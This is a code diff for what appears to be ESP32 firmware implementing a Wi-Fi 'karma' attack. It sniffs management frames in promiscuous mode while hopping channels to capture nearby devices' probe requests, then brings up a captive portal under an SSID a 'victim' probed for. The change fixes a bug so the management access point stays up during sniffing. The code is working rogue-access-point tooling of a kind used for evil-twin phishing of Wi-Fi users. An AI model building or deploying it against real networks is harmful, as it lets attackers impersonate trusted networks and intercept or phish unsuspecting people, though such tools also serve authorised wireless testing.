@@ -179,34 +179,58 @@ static void IRAM_ATTR karmaSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) 
 
 bool karmaProbing() { return s_karmaProbing; }
 
+// BUGFIX: probing previously killed the management AP (softAPdisconnect) -
+// the UI then couldn't reach the device to pick a SSID or stop. Now we
+// ROC-hop (temporary STA channel visits) and the AP stays up throughout.
+static volatile bool s_karmaRun = false;
+static void karmaHopTask(void*) {
+    uint8_t ch = 0;
+    while (s_karmaRun) {
+        ch = (ch % 13) + 1;
+        wifi_roc_req_t roc = {
+            .ifx = WIFI_IF_STA,
+            .type = WIFI_ROC_REQ,
+            .channel = ch,
+            .sec_channel = WIFI_SECOND_CHAN_NONE,
+            .wait_time_ms = 500,
+            .rx_cb = nullptr,
+            .done_cb = nullptr
+        };
+        if (esp_wifi_remain_on_channel(&roc) != ESP_OK) delay(200);
+        else delay(500);
+    }
+    esp_wifi_set_promiscuous(false);
+    vTaskDelete(nullptr);
+}
+static TaskHandle_t s_karmaHopTask = nullptr;
+
 void karmaStart() {
     if (s_karmaProbing || web) return;     // portal busy
     s_probes.clear();
-    WiFi.mode(WIFI_AP_STA);
-    WiFi.softAPdisconnect(true);           // quiet the management AP
-    delay(100);
+    WiFi.mode(WIFI_AP_STA);                // AP stays up!
     esp_wifi_set_promiscuous(true);
     const wifi_promiscuous_filter_t filt = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
     esp_wifi_set_promiscuous_filter(&filt);
     esp_wifi_set_promiscuous_rx_cb(&karmaSniffCb);
+    s_karmaRun = true;
     s_karmaProbing = true;
-    logLine("karma: probe sniffing started (channel hopping)");
+    xTaskCreatePinnedToCore(karmaHopTask, "karmahop", 4096, nullptr, 1, &s_karmaHopTask, 0);
+    logLine("karma: probe sniffing started (AP stays up)");
 }
 
 void karmaStop() {
     if (!s_karmaProbing) return;
-    esp_wifi_set_promiscuous(false);
+    s_karmaRun = false;
+    delay(300);                            // let hop task exit
     s_karmaProbing = false;
-    // restore management AP
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP(cfg.wifiSSID, strlen(cfg.wifiPass) >= 8 ? cfg.wifiPass : "dongle1234");
     logLine("karma: probe sniffing stopped");
 }
 
 bool karmaSpawn(const String& ssid) {
     if (!s_karmaProbing) return false;
-    esp_wifi_set_promiscuous(false);
+    s_karmaRun = false;
+    delay(300);
     s_karmaProbing = false;
     // Bring the portal up under the probed name (channel the victim used
     // doesn't matter - clients scan for the SSID)
